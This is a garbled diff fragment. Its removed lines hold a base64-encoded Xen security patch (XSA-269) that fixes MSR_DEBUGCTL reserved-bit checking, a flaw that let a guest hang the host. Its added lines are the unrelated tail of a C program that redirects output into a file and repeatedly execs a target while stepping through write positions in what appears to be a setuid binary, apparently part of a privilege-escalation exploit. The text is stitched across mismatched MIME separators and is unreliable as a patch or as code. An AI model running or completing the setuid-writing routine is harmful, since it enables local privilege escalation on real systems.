-bT4KU3ViamVjdDogeDg2L3Z0eDogRml4IHRoZSBjaGVja2luZyBmb3IgdW5r
-bm93bi9pbnZhbGlkIE1TUl9ERUJVR0NUTCBiaXRzCgpUaGUgVlBNVV9NT0RF
-X09GRiBlYXJseS1leGl0IGluIHZwbXVfZG9fd3Jtc3IoKSBpbnRyb2R1Y2Vk
-IGJ5IGMvcwoxMWZlOTk4ZTU2IGJ5cGFzc2VzIGFsbCByZXNlcnZlZCBiaXQg
-Y2hlY2tpbmcgaW4gdGhlIGdlbmVyYWwgY2FzZS4gIEFzIGEKcmVzdWx0LCBh
-IGd1ZXN0IGNhbiBlbmFibGUgQlRTIHdoZW4gaXQgc2hvdWxkbid0IGJlIHBl
-cm1pdHRlZCB0bywgYW5kCmxvY2sgdXAgdGhlIGVudGlyZSBob3N0LgoKV2l0
-aCB2UE1VIGFjdGl2ZSAobm90IGEgc2VjdXJpdHkgc3VwcG9ydGVkIGNvbmZp
-Z3VyYXRpb24sIGJ1dCB1c2VmdWwgZm9yCmRlYnVnZ2luZyksIHRoZSByZXNl
-cnZlZCBiaXQgY2hlY2tpbmcgaW4gYnJva2VuLCBjYXVzZWQgYnkgdGhlIG9y
-aWdpbmFsCkJUUyBjaGFuZ2VzZXQgMWE4YWE3NWVkLgoKRnJvbSBhIGNvcnJl
-Y3RuZXNzIHN0YW5kcG9pbnQsIGl0IGlzIG5vdCBwb3NzaWJsZSB0byBoYXZl
-IHR3byBkaWZmZXJlbnQKcGllY2VzIG9mIGNvZGUgcmVzcG9uc2libGUgZm9y
-IGRpZmZlcmVudCBwYXJ0cyBvZiB2YWx1ZSBjaGVja2luZywgaWYKdGhlcmUg
-aXNuJ3QgYW4gYWNjdW11bGF0aW9uIG9mIGJpdHMgd2hpY2ggaGF2ZSBiZWVu
-IGNoZWNrZWQuICBBCnByYWN0aWNhbCB1cHNob3Qgb2YgdGhpcyBpcyB0aGF0
-IGEgZ3Vlc3QgY2FuIHNldCBhbnkgdmFsdWUgaXQKd2lzaGVzICh1c3VhbGx5
-IHJlc3VsdGluZyBpbiBhIHZtZW50cnkgZmFpbHVyZSBmb3IgYmFkIGd1ZXN0
-IHN0YXRlKS4KClRoZXJlZm9yZSwgZml4IHRoaXMgYnkgaW1wbGVtZW50aW5n
-IGFsbCB0aGUgcmVzZXJ2ZWQgYml0IGNoZWNraW5nIGluIHRoZQptYWluIE1T
-Ul9ERUJVR0NUTCBibG9jaywgYW5kIHJlbW92aW5nIGFsbCBoYW5kbGluZyBv
-ZiBERUJVR0NUTCBmcm9tIHRoZQp2UE1VIE1TUiBsb2dpYy4KClRoaXMgaXMg
-WFNBLTI2OQoKU2lnbmVkLW9mZi1ieTogQW5kcmV3IENvb3BlciA8YW5kcmV3
-LmNvb3BlcjNAY2l0cml4LmNvbT4KUmV2aWV3ZWQtYnk6IEphbiBCZXVsaWNo
-IDxqYmV1bGljaEBzdXNlLmNvbT4KCmRpZmYgLS1naXQgYS94ZW4vYXJjaC94
-ODYvY3B1L3ZwbXVfaW50ZWwuYyBiL3hlbi9hcmNoL3g4Ni9jcHUvdnBtdV9p
-bnRlbC5jCmluZGV4IDIwN2UyZTcuLmQ0NDQ0ZjAgMTAwNjQ0Ci0tLSBhL3hl
-bi9hcmNoL3g4Ni9jcHUvdnBtdV9pbnRlbC5jCisrKyBiL3hlbi9hcmNoL3g4
-Ni9jcHUvdnBtdV9pbnRlbC5jCkBAIC01MzUsMjcgKzUzNSw3IEBAIHN0YXRp
-YyBpbnQgY29yZTJfdnBtdV9kb193cm1zcih1bnNpZ25lZCBpbnQgbXNyLCB1
-aW50NjRfdCBtc3JfY29udGVudCwKICAgICB1aW50NjRfdCAqZW5hYmxlZF9j
-bnRyczsKIAogICAgIGlmICggIWNvcmUyX3ZwbXVfbXNyX2NvbW1vbl9jaGVj
-ayhtc3IsICZ0eXBlLCAmaW5kZXgpICkKLSAgICB7Ci0gICAgICAgIC8qIFNw
-ZWNpYWwgaGFuZGxpbmcgZm9yIEJUUyAqLwotICAgICAgICBpZiAoIG1zciA9
-PSBNU1JfSUEzMl9ERUJVR0NUTE1TUiApCi0gICAgICAgIHsKLSAgICAgICAg
-ICAgIHN1cHBvcnRlZCB8PSBJQTMyX0RFQlVHQ1RMTVNSX1RSIHwgSUEzMl9E
-RUJVR0NUTE1TUl9CVFMgfAotICAgICAgICAgICAgICAgICAgICAgICAgIElB
-MzJfREVCVUdDVExNU1JfQlRJTlQ7Ci0KLSAgICAgICAgICAgIGlmICggY3B1
-X2hhcygmY3VycmVudF9jcHVfZGF0YSwgWDg2X0ZFQVRVUkVfRFNDUEwpICkK
-LSAgICAgICAgICAgICAgICBzdXBwb3J0ZWQgfD0gSUEzMl9ERUJVR0NUTE1T
-Ul9CVFNfT0ZGX09TIHwKLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-SUEzMl9ERUJVR0NUTE1TUl9CVFNfT0ZGX1VTUjsKLSAgICAgICAgICAgIGlm
-ICggIShtc3JfY29udGVudCAmIH5zdXBwb3J0ZWQpICYmCi0gICAgICAgICAg
-ICAgICAgIHZwbXVfaXNfc2V0KHZwbXUsIFZQTVVfQ1BVX0hBU19CVFMpICkK
-LSAgICAgICAgICAgICAgICByZXR1cm4gMDsKLSAgICAgICAgICAgIGlmICgg
-KG1zcl9jb250ZW50ICYgc3VwcG9ydGVkKSAmJgotICAgICAgICAgICAgICAg
-ICAhdnBtdV9pc19zZXQodnBtdSwgVlBNVV9DUFVfSEFTX0JUUykgKQotICAg
-ICAgICAgICAgICAgIHByaW50ayhYRU5MT0dfR19XQVJOSU5HCi0gICAgICAg
-ICAgICAgICAgICAgICAgICIlcHY6IERlYnVnIFN0b3JlIHVuc3VwcG9ydGVk
-IG9uIHRoaXMgQ1BVXG4iLAotICAgICAgICAgICAgICAgICAgICAgICBjdXJy
-ZW50KTsKLSAgICAgICAgfQogICAgICAgICByZXR1cm4gLUVJTlZBTDsKLSAg
-ICB9CiAKICAgICBBU1NFUlQoIXN1cHBvcnRlZCk7CiAKZGlmZiAtLWdpdCBh
-L3hlbi9hcmNoL3g4Ni9odm0vdm14L3ZteC5jIGIveGVuL2FyY2gveDg2L2h2
-bS92bXgvdm14LmMKaW5kZXggOTcwNzUxNC4uYWUwMjhkZCAxMDA2NDQKLS0t
-IGEveGVuL2FyY2gveDg2L2h2bS92bXgvdm14LmMKKysrIGIveGVuL2FyY2gv
-eDg2L2h2bS92bXgvdm14LmMKQEAgLTMwMzIsMTEgKzMwMzIsMTQgQEAgdm9p
-ZCB2bXhfdmxhcGljX21zcl9jaGFuZ2VkKHN0cnVjdCB2Y3B1ICp2KQogc3Rh
-dGljIGludCB2bXhfbXNyX3dyaXRlX2ludGVyY2VwdCh1bnNpZ25lZCBpbnQg
-bXNyLCB1aW50NjRfdCBtc3JfY29udGVudCkKIHsKICAgICBzdHJ1Y3QgdmNw
-dSAqdiA9IGN1cnJlbnQ7CisgICAgY29uc3Qgc3RydWN0IGNwdWlkX3BvbGlj
-eSAqY3AgPSB2LT5kb21haW4tPmFyY2guY3B1aWQ7CiAKICAgICBIVk1fREJH
-X0xPRyhEQkdfTEVWRUxfTVNSLCAiZWN4PSUjeCwgbXNyX3ZhbHVlPSUjIlBS
-SXg2NCwgbXNyLCBtc3JfY29udGVudCk7CiAKICAgICBzd2l0Y2ggKCBtc3Ig
-KQogICAgIHsKKyAgICAgICAgdWludDY0X3QgcnN2ZDsKKwogICAgIGNhc2Ug
-TVNSX0lBMzJfU1lTRU5URVJfQ1M6CiAgICAgICAgIF9fdm13cml0ZShHVUVT
-VF9TWVNFTlRFUl9DUywgbXNyX2NvbnRlbnQpOwogICAgICAgICBicmVhazsK
-QEAgLTMwOTEsMTYgKzMwOTQsMjYgQEAgc3RhdGljIGludCB2bXhfbXNyX3dy
-aXRlX2ludGVyY2VwdCh1bnNpZ25lZCBpbnQgbXNyLCB1aW50NjRfdCBtc3Jf
-Y29udGVudCkKIAogICAgIGNhc2UgTVNSX0lBMzJfREVCVUdDVExNU1I6IHsK
-ICAgICAgICAgaW50IGksIHJjID0gMDsKLSAgICAgICAgdWludDY0X3Qgc3Vw
-cG9ydGVkID0gSUEzMl9ERUJVR0NUTE1TUl9MQlIgfCBJQTMyX0RFQlVHQ1RM
-TVNSX0JURjsKIAotICAgICAgICBpZiAoIGJvb3RfY3B1X2hhcyhYODZfRkVB
-VFVSRV9SVE0pICkKLSAgICAgICAgICAgIHN1cHBvcnRlZCB8PSBJQTMyX0RF
-QlVHQ1RMTVNSX1JUTTsKLSAgICAgICAgaWYgKCBtc3JfY29udGVudCAmIH5z
-dXBwb3J0ZWQgKQorICAgICAgICByc3ZkID0gfihJQTMyX0RFQlVHQ1RMTVNS
-X0xCUiB8IElBMzJfREVCVUdDVExNU1JfQlRGKTsKKworICAgICAgICAvKiBU
-T0RPOiBXaXJlIHZQTVUgc2V0dGluZ3MgcHJvcGVybHkgdGhyb3VnaCB0aGUg
-Q1BVSUQgcG9saWN5ICovCisgICAgICAgIGlmICggdnBtdV9pc19zZXQodmNw
-dV92cG11KHYpLCBWUE1VX0NQVV9IQVNfQlRTKSApCiAgICAgICAgIHsKLSAg
-ICAgICAgICAgIC8qIFBlcmhhcHMgc29tZSBvdGhlciBiaXRzIGFyZSBzdXBw
-b3J0ZWQgaW4gdnBtdS4gKi8KLSAgICAgICAgICAgIGlmICggdnBtdV9kb193
-cm1zcihtc3IsIG1zcl9jb250ZW50LCBzdXBwb3J0ZWQpICkKLSAgICAgICAg
-ICAgICAgICBicmVhazsKKyAgICAgICAgICAgIHJzdmQgJj0gfihJQTMyX0RF
-QlVHQ1RMTVNSX1RSIHwgSUEzMl9ERUJVR0NUTE1TUl9CVFMgfAorICAgICAg
-ICAgICAgICAgICAgICAgIElBMzJfREVCVUdDVExNU1JfQlRJTlQpOworCisg
-ICAgICAgICAgICBpZiAoIGNwdV9oYXMoJmN1cnJlbnRfY3B1X2RhdGEsIFg4
-Nl9GRUFUVVJFX0RTQ1BMKSApCisgICAgICAgICAgICAgICAgcnN2ZCAmPSB+
-KElBMzJfREVCVUdDVExNU1JfQlRTX09GRl9PUyB8CisgICAgICAgICAgICAg
-ICAgICAgICAgICAgIElBMzJfREVCVUdDVExNU1JfQlRTX09GRl9VU1IpOwog
-ICAgICAgICB9CisKKyAgICAgICAgaWYgKCBjcC0+ZmVhdC5ydG0gKQorICAg
-ICAgICAgICAgcnN2ZCAmPSB+SUEzMl9ERUJVR0NUTE1TUl9SVE07CisKKyAg
-ICAgICAgaWYgKCBtc3JfY29udGVudCAmIHJzdmQgKQorICAgICAgICAgICAg
-Z290byBncF9mYXVsdDsKKwogICAgICAgICBpZiAoIG1zcl9jb250ZW50ICYg
-SUEzMl9ERUJVR0NUTE1TUl9MQlIgKQogICAgICAgICB7CiAgICAgICAgICAg
-ICBjb25zdCBzdHJ1Y3QgbGJyX2luZm8gKmxiciA9IGxhc3RfYnJhbmNoX21z
-cl9nZXQoKTsK
+      dup2(destFd, 1);
+      dup2(destFd, 2);
+      argv[3]=suidWriteNext;
+      execve(argv[2], argv+3, NULL);
+      fprintf(stderr, "Exec failed\n");
+      return(1);
+    }
+    waitpid(result, NULL, 0);
+    suidWriteNext=suidWriteTestPos;
+//  ftruncate(destFd, suidWriteTestPos-suidExecMinimalElf);
+  }
+  fprintf(stderr, "Completed\n");
+  return(0);
+}
 
---=separator--
+--------------040807080703040204050905--
